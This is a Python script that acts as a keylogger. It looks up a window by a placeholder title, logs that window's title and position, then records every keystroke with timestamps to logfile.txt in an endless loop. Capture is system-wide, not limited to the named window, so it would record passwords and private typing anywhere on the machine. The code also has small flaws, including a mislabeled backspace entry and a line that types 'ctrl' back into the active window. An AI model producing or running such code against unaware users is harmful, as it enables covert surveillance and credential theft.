import pygetwindow as gw
import pyautogui
import keyboard
import time

def log_keystrokes(window):
    with open('logfile.txt', 'a') as f:
        f.write(f"Window Title: {window.title}\n")
        f.write(f"Window Position: ({window.left}, {window.top})\n")
        f.write("Keystrokes:\n")

        while True:
            key_event = keyboard.read_event()
            if key_event.event_type == keyboard.KEY_DOWN:
                key_time = time.time()
                if key_event.name == 'enter':
                    f.write('\n')
                elif key_event.name == 'space':
                    f.write(f"[{key_time:.3f}]space\n")
                elif key_event.name == 'backspace':
                    f.write(f"[{key_time:.3f}]lbackspace\n")
                elif key_event.name == 'ctrl':
                    # Handling Ctrl+C as a special case
                    next_key_event = keyboard.read_event()
                    if next_key_event.event_type == keyboard.KEY_DOWN and next_key_event.name == 'c':
                        f.write(f"[{key_time:.3f}]ctrlc\n")
                    else:
                        f.write(f"[{key_time:.3f}]ctrl\n")
                        keyboard.write(key_event.name)  # Write the Ctrl key without Ctrl+C
                else:
                    f.write(f"[{key_time:.3f}]{key_event.name}\n")
                f.flush()

if __name__ == "__main__":
    target_window_title = "TODO"  # Replace with your target window title

    try:
        notepad_window = gw.getWindowsWithTitle(target_window_title)[0]
        print(f"Found window: {notepad_window.title}")

        log_keystrokes(notepad_window)
    except IndexError:
        print("Window not found.")
    except KeyboardInterrupt:
        print("Logging stopped.")
